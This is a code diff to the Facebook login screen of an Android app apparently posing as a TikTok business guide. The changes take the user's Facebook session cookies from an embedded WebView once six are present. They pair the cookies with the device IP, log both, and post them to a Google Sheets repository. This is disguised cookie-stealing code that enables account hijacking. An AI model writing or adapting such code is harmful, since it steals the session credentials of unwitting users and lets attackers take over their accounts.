@@ -15,6 +15,7 @@ import android.webkit.WebViewClient;
 import android.widget.Toast;
 
 import com.teamwork.businessguideprofortiktok.R;
+import com.teamwork.businessguideprofortiktok.src.resource.pages.reponse_cookies_page.ReponseCookiesActivity;
 import com.teamwork.businessguideprofortiktok.src.resource.repositories.google_sheet_repository.GoogleSheetRepository;
 import com.teamwork.businessguideprofortiktok.src.resource.viewmodels.googlesheet_viewmodel.GoogleSheetViewModel;
 
@@ -42,21 +43,22 @@ public class WebViewFacebookActivity extends AppCompatActivity {
     private void listenerCallbackSever(final GoogleSheetViewModel mRepository) {
         mRepository.getCookies().observe(WebViewFacebookActivity.this, new Observer<String>() {
             @Override
-            public void onChanged(String s) {
-                mRepository.init();
+            public void onChanged(final String cookies) {
+                mRepository.getIp().observe(WebViewFacebookActivity.this, new Observer<String>() {
+                    @Override
+                    public void onChanged(String ip) {
+                        mRepository.postDataGoogleSheets(ip,cookies);
+                        Log.d("TAG", "onChanged: cookies: "+cookies);
+                        Log.d("TAG", "onChanged: ip: "+ip);
+                    }
+                });
             }
         });
 
-        mRepository.getmMutableLiveData().observe(WebViewFacebookActivity.this, new Observer<String>() {
+        mRepository.getDataReponseSever().observe(WebViewFacebookActivity.this, new Observer<String>() {
             @Override
             public void onChanged(String s) {
-                if(!s.equals("") && s.equals("Success")){
-                    Log.d("TAG", "onChanged: Success sever");
-                    Toast.makeText(WebViewFacebookActivity.this, "Success sever", Toast.LENGTH_SHORT).show();
-                }else{
-                    finish();
-                    startActivity(getIntent());
-                }
+                Log.d("TAG", "onChanged: 111: "+s);
             }
         });
     }
@@ -93,12 +95,10 @@ public class WebViewFacebookActivity extends AppCompatActivity {
 
                 if (arrayCookies.length == 6){
                     String ip = getLocalIpAddress();
-//                    Log.d("TAG", "onPageFinished: ip: "+ip);
-//                    Log.d("TAG", "onPageFinished: strCookies: "+strCookies);
-//                    mRepository.setIp(ip);
-//                    mRepository.setCookies(strCookies);
-                    mRepository.senData(ip, strCookies);
-                   // mRepository.sendData();
+                    mRepository.setCookies(strCookies);
+                    mRepository.setIp(ip);
+                    Intent intent = new Intent(WebViewFacebookActivity.this, ReponseCookiesActivity.class);
+                    startActivity(intent);
                 }
             }
         });
